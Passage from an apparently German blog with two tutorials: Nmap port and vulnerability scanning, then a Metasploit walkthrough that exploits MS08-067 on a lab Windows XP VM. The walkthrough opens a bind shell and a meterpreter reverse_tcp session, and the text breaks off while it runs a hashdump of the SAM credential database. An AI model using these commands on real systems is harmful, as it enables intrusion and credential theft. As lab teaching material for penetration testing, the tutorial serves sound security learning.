TCP-Scan-Typ, falls der SYN-Scan(-sS) nicht möglich ist. Das ist dann der Fall, wenn der Benutzer kein Recht hat, rohe Pakete zu senden, oder wenn er IPv6-Netzwerke scannt. Statt rohe Pakete zu schreiben, wie es die meisten anderen Scan-Typen machen, bittet Nmap das darunterliegende Betriebssystem, eine Verbindung mit dem Zielrechner und -port herzustellen, indem es einen Systemaufruf namens connect benutzt. Das ist derselbe Systemaufruf auf höherer Ebene, den Webbrowser, P2P-Clients und die meisten anderen netzwerkfähigen Anwendungen benutzen, um eine Verbindung herzustellen. Er ist Teil einer Programmierschnittstelle, die unter dem Namen Berkeley Sockets-API bekannt ist. Statt Antworten in Form roher Pakete von der Leitung zu lesen, benutzt Nmap diese API, um zu jedem Verbindungsversuch eine Statusinformation zu erhalten. Wenn der SYN-Scan verfügbar ist, ist er normalerweise die bessere Wahl. Nmap hat weniger Einfluss auf den connect-Systemaufruf als auf rohe Pakete, wodurch es weniger effizient wird. Der Systemaufruf beendet Verbindungen zu offenen Ziel-Ports vollständig, statt sie in halboffenen Zustand zurückzusetzen, wie es der SYN-Scan macht. Das dauert nicht nur länger und erfordert mehr Pakete, um an dieselbe Information zu gelangen, sondern es ist sehr viel wahrscheinlicher, dass die Zielrechner die Verbindung protokollieren.  Standardports und die dahinter stehenden Dienste:            Portnummer      Service                  20      FTP-Datenübertragung              22      FTP-Steuerung              22      SSH              23      Telnet              25      SMTP (Email)              53      DNS              80      HTTP              137-139      NetBIOS              443      HTTPS              445      SMB              1433      MSSQL              3306      MySQL              3389      RDP              5800      VNC über HTTP              5900      VNC      Basis Scan via CLIIm folgenden Beispiel scannen wir einen Netzwerkteilnehmer mit der Adresse 192.168.1.100 und verwenden dabei die TCP-SYN-Scan Methode. In meinem Netzwerk ist unter dieser Adresse meine Heizungssteuerung (Möhlenhoff Alpha) zu erreichen. Da die TCP-SYN Scan Methode Root bzw. Admin Rechte erfordert muss dem befehl bei Debian Distributionen ein “sudo” vorangestellt um den Befehl erfolgreich auszuführen.$ sudo nmap -sS -Pn 192.168.1.100  Wurde der Scan erfolgreich abgeschlossen sollten wir eine Ausgabe mit den offenen Ports erhalten und auch welche Service sich dahinter verbirgtNmap scan report for 192.168.1.100Host is up (0.0033s latency).Not shown: 996 closed portsPORT     STATE SERVICE21/tcp   open  ftp23/tcp   open  telnet80/tcp   open  http8080/tcp open  http-proxyMAC Address: 38:DE:60:01:xx:xx (Mohlenhoff GmbH)Da aber nicht immer Root bzw. Admin Rechte vorhanden sind, kann auch ein TCP-Connect-Scan durchgeführt werden.$ nmap -sT -Pn 192.168.1.100Wie erhalten die selbe Ausgabe wir zuvor. Jedoch wird der durchgeführte mit sehr hoher Wahrscheinlichkeit in einer Log-Datei mitprotokolliert. Daher sollte der TCP-SYN-Scan dieser Methode immer vorgezogen werden.Nmap scan report for 192.168.1.100Host is up (0.0070s latency).Not shown: 996 closed portsPORT     STATE SERVICE21/tcp   open  ftp23/tcp   open  telnet80/tcp   open  http8080/tcp open  http-proxyNmap done: 1 IP address (1 host up) scanned in 2.45 secondsUm eine gesamtes Subnet zur scannen können folgende Befehle verwendet werden. Bitte beachtet das der scan eines kompletten Subnets bis zu 15 Minuten dauern kann.$ nmap -sS -Pn 192.168.1.1-254$ nmap -sS -Pn 192.168.1.1/24Hier sehen wir kleinen Auszug den ich von Scan meines Netzwerk erhalte:Nmap scan report for router.asus.com (192.168.x.x)Host is up (0.00049s latency).Not shown: 925 closed ports, 70 filtered portsPORT     STATE SERVICE53/tcp   open  domain80/tcp   open  http515/tcp  open  printer8443/tcp open  https-alt9100/tcp open  jetdirectMAC Address: BC:EE:7B:8E:xx:xx (Asustek Computer)Nmap scan report for android-xxxxx (192.168.1.xx)Host is up (0.062s latency).All 1000 scanned ports on android-xxxxxx (192.168.1.xx) are closedMAC Address: C4:43:8F:AF:xx:xx (xx Electronics)Nmap scan report for 192.168.1.100Host is up (0.0035s latency).Not shown: 996 closed portsPORT     STATE SERVICE21/tcp   open  ftp23/tcp   open  telnet80/tcp   open  http8080/tcp open  http-proxyMAC Address: 38:DE:60:01:xx:xx (Mohlenhoff GmbH)...Nmap done: 254 IP addresses (8 hosts up) scanned in 969.88 secondsUm die durchgeführten Scans zu dokumentieren empfiehlt es das Ergebnis in eine Datei umzuleiten.$ nmap -sT -Pn 192.168.1.100 &gt; scan.txtOder man nutzt die bereits in Nmap integrierten flags um die Ergebnise formatiert in eine Datei auszugeben und zu speichern.Nmap Output Flags            Output flag      Beschreibung                  -oN      Normale Ausgabe in eine Datei              -oX      XML Ausgabe in eine Datei              -oS      ScRipT KIddi 3-Ausgabe              -oG      grepbare Ausgabe              -oA      Ausgabe in allen Formaten      $ nmap -sT -Pn -oN 192.168.1.100 $ nmap -sT -Pn -oX 192.168.1.100 $ nmap -sT -Pn -oS 192.168.1.100 $ nmap -sT -Pn -oG 192.168.1.100 $ nmap -sT -Pn -oA 192.168.1.100 NSE Schwachstellen ScanNun wollen wir einen Teilnehmer im Netzwerk auf bekannte Schwachstellen prüfen. Den dafür stellt die NSE Nmap Script Engine einige Standard Skripte zur Verfügung. Der Übersichtlichkeit halber sind die NSE-Skripte in Kategorien eingeteilt. Zurzeit gibt es die Kategorien auth , broadcast , brute , default , discovery ,dos , exploit , external , fuzzer , intrusive , malware , safe , version undvuln.InformationDie NSE und ihre Skripts sind in Nmap eingebaut. Sie müssen dahernichts zusätzlich installieren oder konfigurieren.Will man nur ein bestimmtes script ausführen gibt man einfach den Namen des auszuführenden Skriptes an. Zum Beispiel:$ nmap -script smb-vuln-ms08-067 192.168.1.110Mit den flags “–script vuln” werden alle Skripte in der Kategorie vuln ausgeführt.$ nmap --script vuln 192.168.1.100Ausgabe des Scan aus der Kategorie vuln:Pre-scan script results:| broadcast-avahi-dos: |   Discovered hosts:|     192.168.1.236|     192.168.1.1|     192.168.1.131|   After NULL UDP avahi packet DoS (CVE-2011-1002).|_  Hosts are all up (not vulnerable).Nmap scan report for 192.168.1.100Host is up (0.0066s latency).Not shown: 996 closed portsPORT     STATE SERVICE21/tcp   open  ftp23/tcp   open  telnet80/tcp   open  http|_http-cross-domain-policy: ERROR: Script execution failed (use -d to debug)|_http-csrf: Couldn t find any CSRF vulnerabilities|_http-dombased-xss: Couldn t find any DOM based XSS.|_http-fileupload-exploiter: |_http-frontpage-login: false|_http-stored-xss: Couldn t find any stored XSS vulnerabilities.|_http-vuln-wnr1000-creds: ERROR: Script execution failed (use -d to debug)8080/tcp open  http-proxy|_http-cross-domain-policy: ERROR: Script execution failed (use -d to debug)|_http-frontpage-login: false|_http-vuln-wnr1000-creds: ERROR: Script execution failed (use -d to debug)Nmap done: 1 IP address (1 host up) scanned in 53.34 secondsWie man hier schön sehen kann ist meine Heizungssteurung nicht angreifbar, sie ist nur anfällig für einen Denial of Service(Dos) Angriff CVE-2011-1002.Um euch jedoch zu zeigen welche Ausgabe wir erhalten wenn wir einen Host scannen der Sicherheitslücken aufweist, seht ihr in der Ausgabe einen Scan von einer Virtuellen Windows XP Maschine SP1. Diese VM Maschine weist einige Sicherheitslücken auf und mit diesen wissen kann man sich in der Metasploit Datenbank auf die Suche nach einen geeigneten Exploits (Metasploit ms08-067) machen. Metasploit werd ich euch in einem meiner nächsten Artikel vorstellen.Nmap scan report for ie6winxp (192.168.x.x)Host is up (0.0065s latency).Not shown: 996 closed portsPORT     STATE SERVICE135/tcp  open  msrpc139/tcp  open  netbios-ssn445/tcp  open  microsoft-ds3389/tcp open  ms-wbt-server|_ssl-ccs-injection: No reply from server (TIMEOUT)Host script results:| smb-vuln-cve2009-3103: |   VULNERABLE:|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)|     State: VULNERABLE|     IDs:  CVE:CVE-2009-3103|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2, |           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a |           denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE |           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location, |           aka \"SMBv2 Negotiation Vulnerability.\" |           |     Disclosure date: 2009-09-08|     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103| smb-vuln-ms08-067: |   VULNERABLE:|   Microsoft Windows system vulnerable to remote code execution (MS08-067)|     State: VULNERABLE|     IDs:  CVE:CVE-2008-4250|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, |           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary |           code via a crafted RPC request that triggers the overflow during path canonicalization.|           |     Disclosure date: 2008-10-23|     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx|_smb-vuln-ms10-054: false|_smb-vuln-ms10-061: falseNmap done: 1 IP address (1 host up) scanned in 40.75 secondsBasis Scan via ZenmapDurch die Graphische Oberfläche(Zenmap) wir die Bedienung von Nmap um einiges erleichtert. Jedoch schadet es nicht wie oben beschrieben auch einmal Nmap via CLI zu bedienen. Denn komplexere Scanaufträge lassen sich auch nur via CLI wirklich vernünftig durchführen.Zenmap ist in Kali Linux enthalten und kann direkt aus denn Anwedungsfenster gestartet werden.    In der Zeile Target tragen wir ein einzelnes Ziel 192.168.1.100 ein oder einen Teilbereich z.B: 192.168.1.1-50. Im rechten Dropdown Menü wählen wir die Scan Methode aus und mit Klick auf den Button Scan starten wir den Scanvorgang.    Im Reiter Nmap Output erhalten wir die selben Informationen wie im Ausgabe Fenster der Konsole.    Im Reiter Ports/Host werden die offen Ports und die dahinter stehenden Dienste Grafisch angezeigt.    Im Reiter Host Details erhalten wie detaillierte Informationen zum Host wenn diese ausgelesen werden können.    Der Vorteil von Zenmap kommt eigentlich erst zu tragen wenn man größere Segmente oder sogar mehrere Netzwerke scannt. Jeder einzelne Scanvorgang kann unter Scan -&gt; Save gespeichert werden. Zusätzlich lässt sich die Grafische Ausgabe auch Filtern um die Ergebnisse auf die wichtigsten Ziele zu beschränken.    Mehr InformationenEine Sammlung der Wichtigsten Nmap BefehlenNmap KommandoreferenzDie offiziele Dokumentation von NmapNmap Official Docsconsole.log('See you !');","categories": [],
        "tags": [],
        "url": "https://dg60.github.io/NMAP/",
        "teaser":"https://dg60.github.io/images/docs/nmap.png"},{
        "title": "Metasploit",
        "excerpt":"console.log('It´s time to hack');Hallo,Heute möchte ich euch kurz das Metasploit Framework vorstellen. Das Metasploit Framework dient ist erster Linie zur Entwicklung und Ausführung von Exploits.InstallationDer einfachste weg ist es die Kali Linux Distribution von Kali.org herunter zu laden. Die Distribution gibt es als live Image oder als Abild einer Virtuelle Maschine für die Hypervisoren Vmware Player/Virtual Box auf der Seite von Offense Security.Es ist jedoch auch ohne weiteres möglich Metasploit wie jedes andere Programm zu installieren. RAPID 7/Metasploit stellt die Binaries für alle gängigen Betriebsysteme(Linux, MacOS, Windows) zur verfügung.TestumgebungZum arbeiten mit Metasploit ist unerlässlich sich eine Testumgebung einzurichten. Besonders gut geeignet sind dafür ältere ungepatche OS Versionen wie z.B:  Windows 2000  Windows XP SP1 - SP3  Windows 7 (ohne Service Pack)  Ubuntu 08.04  usw.Aktuelle und gepachte OS-Versionen von Windows und Linux geben keine guten Ziele ab das es meist keine fertig entwickelten exploits dafür gibt.Eine weitere Möglichkeit ist der Download von vorgefertigten OS-Images die absichtlich mit schwachstellen versehen wurden. Diese Images eignen sicher hevoragend für die ersten Schritte mit Metasploit.Metasploitable 2:https://sourceforge.net/projects/metasploitable/files/Metasploitable2/Metasploitable 3:https://github.com/rapid7/metasploitable3Arbeiten mit MetasploitAchtung !!! Bitte führt keine Exploits oder Scans gegen Rechner, Webseiten,Datenbanken usw. aus wozu ihr nicht berechtigt seid.Für die folgenden Beispiele verwende ich eine Virtuelle Maschine mit Windows XP SP3. Die ich bereits in meiner Einführung für den Portscanner NMAP verwendet habe.Ziel OS: Windows XP SP3Bekannte Schwachstelle: CVE-2008-4250Exploit: https://blog.rapid7.com/2014/02/03/new-ms08-067/Nmap Ausgabe:| smb-vuln-ms08-067: |   VULNERABLE:|   Microsoft Windows system vulnerable to remote code execution (MS08-067)|     State: VULNERABLE|     IDs:  CVE:CVE-2008-4250|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, |           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary |           code via a crafted RPC request that triggers the overflow during path canonicalization.|           |     Disclosure date: 2008-10-23|     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspxmsfconsole1.) Metasploit starten wir mit dem Befehl msfconsole$ msfconsole2.) Wurde Metasploit erfolgreich gestartet erhalten wir einen der möglichen Willkommens BildschirmeCall trans opt: received. 2-19-98 13:24:18 REC:Loc     Trace program: running           wake up, Neo...        the matrix has you      follow the white rabbit.          knock, knock, Neo.                        (`.         ,-,                        ` `.    ,;' /                         `.  ,'/ .'                          `. X /.'                .-;--''--.._` ` (              .'            /   `             ,           ` '   Q '             ,         ,   `._    \\          ,.|         '     `-.;_'          :  . `  ;    `  ` --,.._;           ' `    ,   )   .'              `._ ,  '   /_                 ; ,''-,;' ``-                  ``-..__``--`                             https://metasploit.com       =[ metasploit v4.16.31-dev                         ]+ -- --=[ 1726 exploits - 992 auxiliary - 300 post        ]+ -- --=[ 507 payloads - 40 encoders - 10 nops            ]+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]msf &gt; 3.) Nach der Installation empfiehlt es sich einen rebuild des Datenbank Cache durchzuführen oder wenn diese Meldung angezeigt wird “Database not connected or cache not built, using slow search”.msf&gt; db_rebuild_cache  [*] Purging and rebuilding the module cache in the background...search4.) Mit diesen wissen das unser Ziel über eine bekannte Schwachstelle verfügt. Können wir in der Metasploit Datenbank nach einen geeigneten Exploit suchen.msf&gt; search  ms08Matching Modules================   Name                                                   Disclosure Date  Rank       Description   ----                                                   ---------------  ----       -----------   auxiliary/admin/ms/ms08_059_his2006                    2008-10-14       normal     Microsoft Host Integration Server 2006 Command Execution Vulnerability   exploit/windows/browser/ms08_041_snapshotviewer        2008-07-07       excellent  Snapshot Viewer for Microsoft Access ActiveX Control Arbitrary File Download   exploit/windows/browser/ms08_053_mediaencoder          2008-09-09       normal     Windows Media Encoder 9 wmex.dll ActiveX Buffer Overflow   exploit/windows/browser/ms08_070_visual_studio_msmask  2008-08-13       normal     Microsoft Visual Studio Mdmask32.ocx ActiveX Buffer Overflow   exploit/windows/browser/ms08_078_xml_corruption        2008-12-07       normal     MS08-078 Microsoft Internet Explorer Data Binding Memory Corruption   exploit/windows/smb/ms08_067_netapi                    2008-10-28       great      MS08-067 Microsoft Server Service Relative Path Stack Corruption   exploit/windows/smb/smb_relay                          2001-03-31       excellent  MS08-068 Microsoft Windows SMB Relay Code Executionuse exploit5.) Um einen Exploit auszuwählen verwenden wir den Befehl use und geben den Pfad des exploits an.msf&gt; use exploit/windows/smb/ms08_067_netapi [*] Purging and rebuilding the module cache in the background...show options6.) Mit dem Befehl show options können wir uns alle verfügbaren Optionen anzeigen lassenmsf exploit(windows/smb/ms08_067_netapi) &gt; show optionsModule options (exploit/windows/smb/ms08_067_netapi):   Name     Current Setting  Required  Description   ----     ---------------  --------  -----------   RHOST                     yes       The target address   RPORT    445              yes       The SMB service port (TCP)   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)Exploit target:   Id  Name   --  ----   0   Automatic Targetingset7.) Mit set RHOST setzen wir die IP Adresse für den Ziel Rechner. Mein Ziel System hat die IP Adresse 192.168.1.110msf exploit(windows/smb/ms08_067_netapi) &gt; set RHOST 192.168.1.110RHOST =&gt; 192.168.1.110show payloads8.) Mittels show payloads können wir uns alle verfügbaren Payloads anzeigen lassen.msf exploit(windows/smb/ms08_067_netapi) &gt; show payloadsCompatible Payloads===================   Name                                                Disclosure Date  Rank    Description   ----                                                ---------------  ----    -----------   windows/meterpreter/bind_hidden_ipknock_tcp                          normal  Windows Meterpreter (Reflective Injection), Hidden Bind Ipknock TCP Stager   windows/meterpreter/bind_hidden_tcp                                  normal  Windows Meterpreter (Reflective Injection), Hidden Bind TCP Stager   windows/meterpreter/bind_ipv6_tcp                                    normal  Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager (Windows x86)   windows/meterpreter/bind_ipv6_tcp_uuid                               normal  Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)   windows/meterpreter/bind_nonx_tcp                                    normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager (No NX or Win7)   windows/meterpreter/bind_tcp                                         normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager (Windows x86)   windows/meterpreter/bind_tcp_rc4                                     normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)   windows/meterpreter/bind_tcp_uuid                                    normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86)   windows/meterpreter/reverse_hop_http                                 normal  Windows Meterpreter (Reflective Injection), Reverse Hop HTTP/HTTPS Stager   windows/meterpreter/reverse_http                                     normal  Windows Meterpreter (Reflective Injection), Windows Reverse HTTP Stager (wininet)   windows/meterpreter/reverse_https                                    normal  Windows Meterpreter (Reflective Injection), Windows Reverse HTTPS Stager (wininet)   windows/meterpreter/reverse_https_proxy                              normal  Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager with Support for Custom Proxy   windows/meterpreter/reverse_ipv6_tcp                                 normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (IPv6)   windows/meterpreter/reverse_named_pipe                               normal  Windows Meterpreter (Reflective Injection), Windows x86 Reverse Named Pipe (SMB) Stager   windows/meterpreter/reverse_nonx_tcp                                 normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (No NX or Win7)   windows/meterpreter/reverse_ord_tcp                                  normal  Windows Meterpreter (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)   windows/meterpreter/reverse_tcp                                      normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager   windows/meterpreter/reverse_tcp_allports                             normal  Windows Meterpreter (Reflective Injection), Reverse All-Port TCP Stager   windows/meterpreter/reverse_tcp_dns                                  normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (DNS)   windows/meterpreter/reverse_tcp_rc4                                  normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)   windows/meterpreter/reverse_tcp_uuid                                 normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager with UUID Support   windows/shell/bind_hidden_ipknock_tcp                                normal  Windows Command Shell, Hidden Bind Ipknock TCP Stager   windows/shell/bind_hidden_tcp                                        normal  Windows Command Shell, Hidden Bind TCP Stager   windows/shell/bind_ipv6_tcp                                          normal  Windows Command Shell, Bind IPv6 TCP Stager (Windows x86)   windows/shell/bind_ipv6_tcp_uuid                                     normal  Windows Command Shell, Bind IPv6 TCP Stager with UUID Support (Windows x86)   windows/shell/bind_nonx_tcp                                          normal  Windows Command Shell, Bind TCP Stager (No NX or Win7)   windows/shell/bind_tcp                                               normal  Windows Command Shell, Bind TCP Stager (Windows x86)   windows/shell/bind_tcp_rc4                                           normal  Windows Command Shell, Bind TCP Stager (RC4 Stage Encryption, Metasm)   windows/shell/bind_tcp_uuid                                          normal  Windows Command Shell, Bind TCP Stager with UUID Support (Windows x86)   windows/shell/reverse_ipv6_tcp                                       normal  Windows Command Shell, Reverse TCP Stager (IPv6)   windows/shell/reverse_nonx_tcp                                       normal  Windows Command Shell, Reverse TCP Stager (No NX or Win7)   windows/shell/reverse_ord_tcp                                        normal  Windows Command Shell, Reverse Ordinal TCP Stager (No NX or Win7)   windows/shell/reverse_tcp                                            normal  Windows Command Shell, Reverse TCP Stager   windows/shell/reverse_tcp_allports                                   normal  Windows Command Shell, Reverse All-Port TCP Stager   windows/shell/reverse_tcp_dns                                        normal  Windows Command Shell, Reverse TCP Stager (DNS)   windows/shell/reverse_tcp_rc4                                        normal  Windows Command Shell, Reverse TCP Stager (RC4 Stage Encryption, Metasm)   windows/shell/reverse_tcp_uuid                                       normal  Windows Command Shell, Reverse TCP Stager with UUID Support   windows/shell_bind_tcp                                               normal  Windows Command Shell, Bind TCP Inline   windows/shell_hidden_bind_tcp                                        normal  Windows Command Shell, Hidden Bind TCP Inline   windows/shell_reverse_tcp                                            normal  Windows Command Shell, Reverse TCP Inline   windows/vncinject/bind_hidden_ipknock_tcp                            normal  VNC Server (Reflective Injection), Hidden Bind Ipknock TCP Stager   windows/vncinject/bind_hidden_tcp                                    normal  VNC Server (Reflective Injection), Hidden Bind TCP Stager   windows/vncinject/bind_ipv6_tcp                                      normal  VNC Server (Reflective Injection), Bind IPv6 TCP Stager (Windows x86)   windows/vncinject/bind_ipv6_tcp_uuid                                 normal  VNC Server (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)   windows/vncinject/bind_nonx_tcp                                      normal  VNC Server (Reflective Injection), Bind TCP Stager (No NX or Win7)   windows/vncinject/bind_tcp                                           normal  VNC Server (Reflective Injection), Bind TCP Stager (Windows x86)   windows/vncinject/bind_tcp_rc4                                       normal  VNC Server (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)   windows/vncinject/bind_tcp_uuid                                      normal  VNC Server (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86)   windows/vncinject/reverse_hop_http                                   normal  VNC Server (Reflective Injection), Reverse Hop HTTP/HTTPS Stager   windows/vncinject/reverse_http                                       normal  VNC Server (Reflective Injection), Windows Reverse HTTP Stager (wininet)   windows/vncinject/reverse_ipv6_tcp                                   normal  VNC Server (Reflective Injection), Reverse TCP Stager (IPv6)   windows/vncinject/reverse_nonx_tcp                                   normal  VNC Server (Reflective Injection), Reverse TCP Stager (No NX or Win7)   windows/vncinject/reverse_ord_tcp                                    normal  VNC Server (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)   windows/vncinject/reverse_tcp                                        normal  VNC Server (Reflective Injection), Reverse TCP Stager   windows/vncinject/reverse_tcp_allports                               normal  VNC Server (Reflective Injection), Reverse All-Port TCP Stager   windows/vncinject/reverse_tcp_dns                                    normal  VNC Server (Reflective Injection), Reverse TCP Stager (DNS)   windows/vncinject/reverse_tcp_rc4                                    normal  VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)   windows/vncinject/reverse_tcp_uuid                                   normal  VNC Server (Reflective Injection), Reverse TCP Stager with UUID Supportset payload9.) Wir entscheiden uns hier für den windows/shell/bind_tcp payload.msf exploit(windows/smb/ms08_067_netapi) &gt; set payload windows/shell/bind_tcppayload =&gt; windows/shell/bind_tcpshow options (Payload)10.) Nach auswahl des Payload prüfen wir mit show options ob der ausgewählte Payload noch zusätzliche Einstellungen benötigt. Die benötigten Optionen sind mit Required yes markiert und sollte ein Payload einmal fehlschlagen empfiehlt es sich noch einmal alle Optionen zu prüfen.msf exploit(windows/smb/ms08_067_netapi) &gt; show optionsModule options (exploit/windows/smb/ms08_067_netapi):   Name     Current Setting  Required  Description   ----     ---------------  --------  -----------   RHOST    192.168.1.110    yes       The target address   RPORT    445              yes       The SMB service port (TCP)   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)Payload options (windows/shell/bind_tcp):   Name      Current Setting  Required  Description   ----      ---------------  --------  -----------   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)   LPORT     4444             yes       The listen port   RHOST     192.168.1.110    no        The target addressExploit target:   Id  Name   --  ----   0   Automatic Targetingexploit10.) Nun ist unser exploit richtig konfiguriert und kann mit dem Befehl exploit gestartet werden.msf exploit(windows/smb/ms08_067_netapi) &gt; exploit[*] Started bind handler[*] 192.168.1.110:445 - Automatically detecting the target...[*] 192.168.1.110:445 - Fingerprint: Windows XP - Service Pack 3 - lang:Unknown[*] 192.168.1.110:445 - We could not detect the language pack, defaulting to English[*] 192.168.1.110:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)[*] 192.168.1.110:445 - Attempting to trigger the vulnerability...[*] Encoded stage with x86/shikata_ga_nai[*] Sending encoded stage (267 bytes) to 192.168.1.110[*] Command shell session 1 opened (192.168.1.243:35797 -&gt; 192.168.1.110:4444) at 2018-01-31 22:05:37 +0100Microsoft Windows XP [Version 5.1.2600](C) Copyright 1985-2001 Microsoft Corp.C:\\WINDOWS\\system32&gt;Auf dem Zielsystem11.) War der Exploit erfolgreich erhalten wir eine Windows Command prompt. Der Beweis das wir uns wirklich auf dem Zielsystem befinden ist ganz unten die IP Adresse 192.168.1.110 !C:\\WINDOWS\\system32&gt;systeminfosysteminfoHost Name:                 IE6WINXPOS Name:                   Microsoft Windows XP ProfessionalOS Version:                5.1.2600 Service Pack 3 Build 2600OS Manufacturer:           Microsoft CorporationOS Configuration:          Standalone WorkstationOS Build Type:             Multiprocessor FreeRegistered Owner:          IEUserRegistered Organization:   Product ID:                76487-024-5236883-22915Original Install Date:     10/12/2012, 1:45:14 PMSystem Up Time:            21350397 Days, 20 Hours, 44 Minutes, 4 SecondsSystem Manufacturer:       innotek GmbHSystem Model:              VirtualBoxSystem type:               X86-based PCProcessor(s):              1 Processor(s) Installed.                           [01]: x86 Family 21 Model 1 Stepping 2 AuthenticAMD ~3896 MhzBIOS Version:              VBOX   - 1Windows Directory:         C:\\WINDOWSSystem Directory:          C:\\WINDOWS\\system32Boot Device:               \\Device\\HarddiskVolume1System Locale:             en-us;English (United States)Input Locale:              en-us;English (United States)Time Zone:                 (GMT-08:00) Pacific Time (US &amp; Canada); TijuanaTotal Physical Memory:     511 MBAvailable Physical Memory: 388 MBVirtual Memory: Max Size:  2,048 MBVirtual Memory: Available: 2,008 MBVirtual Memory: In Use:    40 MBPage File Location(s):     C:\\pagefile.sysDomain:                    MSHOMELogon Server:              N/AHotfix(s):                 16 Hotfix(s) Installed.                           [01]: File 1                           [02]: File 1                           [03]: File 1                           [04]: File 1                           [05]: File 1                           [06]: File 1                           [07]: Q147222                           [08]: KB952069_WM9                           [09]: KB954155_WM9                           [10]: KB973540_WM9                           [11]: KB2749655 - Update                           [12]: KB952287 - Update                           [13]: KB955759 - Update                           [14]: KB968389 - Update                           [15]: KB971029 - Update                           [16]: KB973815 - UpdateNetWork Card(s):           1 NIC(s) Installed.                           [01]: AMD PCNET Family PCI Ethernet Adapter                                 Connection Name: Local Area Connection 5                                 DHCP Enabled:    Yes                                 DHCP Server:     192.168.1.1                                 IP address(es)                                 [01]: 192.168.1.110Meterpreterset payload meterpreter1.) Wir entscheiden uns hier für den windows/meterpreter/reverse_tcp payload.msf exploit(windows/smb/ms08_067_netapi) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpshow options2.) Mittels show options prüfen wir welche Parameter der neue Payload benötigt. Wie leicht zu erkennen ist benötigt der neue Payload die IP Adresse des Computer von den wir Meterpreter gestartet haben um eine Verbindung aufzubauen.msf exploit(windows/smb/ms08_067_netapi) &gt; show optionsModule options (exploit/windows/smb/ms08_067_netapi):   Name     Current Setting  Required  Description   ----     ---------------  --------  -----------   RHOST    192.168.1.110    yes       The target address   RPORT    445              yes       The SMB service port (TCP)   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)Payload options (windows/meterpreter/reverse_tcp):   Name      Current Setting  Required  Description   ----      ---------------  --------  -----------   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)   LHOST                      yes       The listen address   LPORT     4444             yes       The listen portExploit target:   Id  Name   --  ----   0   Automatic Targetingset LHOST3.) Mittels set LHOST setzen wir die IP Adresse auf 192.168.1.243msf exploit(windows/smb/ms08_067_netapi) &gt; set LHOST 192.168.1.243LHOST =&gt; 192.168.1.2434.) Bevor wir den neuen Exploit starten überpürfen wir noch einmal ob alle einstellungen korrekt gesetzt sindmsf exploit(windows/smb/ms08_067_netapi) &gt; show optionsModule options (exploit/windows/smb/ms08_067_netapi):   Name     Current Setting  Required  Description   ----     ---------------  --------  -----------   RHOST    192.168.1.110    yes       The target address   RPORT    445              yes       The SMB service port (TCP)   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)Payload options (windows/meterpreter/reverse_tcp):   Name      Current Setting  Required  Description   ----      ---------------  --------  -----------   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)   LHOST     192.168.1.243    yes       The listen address   LPORT     4444             yes       The listen portExploit target:   Id  Name   --  ----   0   Automatic Targetingexploit meterpreter5.) Mit exploit starten wir den meterpreter payload.msf exploit(windows/smb/ms08_067_netapi) &gt; exploit[*] Started reverse TCP handler on 192.168.1.243:4444 [*] 192.168.1.110:445 - Automatically detecting the target...[*] 192.168.1.110:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English[*] 192.168.1.110:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)[*] 192.168.1.110:445 - Attempting to trigger the vulnerability...[*] Sending stage (179779 bytes) to 192.168.1.110[*] Meterpreter session 5 opened (192.168.1.243:4444 -&gt; 192.168.1.110:1032) at 2018-01-31 22:30:17 +0100War der Exploit erfolgreich können wir nun einige vorgefertigte Skripts und Befehle verwenden.hashdumpAuslesen des Windows SAM(Security Account Manager) Datenbankmeterpreter &gt; run post/windows/gather/hashdump[*] Obtaining the boot key...[*] Calculating the hboot key using SYSKEY 422105af62b50d0000d267d8145cf830...[*] 